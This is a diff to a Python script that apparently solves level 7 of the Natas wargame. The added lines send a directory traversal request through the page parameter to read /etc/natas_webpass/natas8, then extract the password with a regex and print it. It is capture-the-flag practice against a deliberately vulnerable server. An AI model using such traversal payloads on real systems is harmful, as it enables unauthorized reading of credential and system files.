@@ -31,3 +31,10 @@ print(f'{div_content}\n')
 # natas7 > natas > www > var > / 
 # and the password, mentioned in the hint for this level, is stored in /etc/natas_webpass/natas8
 # therefore, we can use ../../../../etc/natas_webpass/natas8
+response = session.get(URL + 'index.php?page=../../../../etc/natas_webpass/natas8')
+div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
+print(f'{div_content}\n')
+
+
+password = re.search(r'<br/>\n(\w+)\n\n<!--', str(div_content)).group(1)
+print(f'natas8 password: {password}')
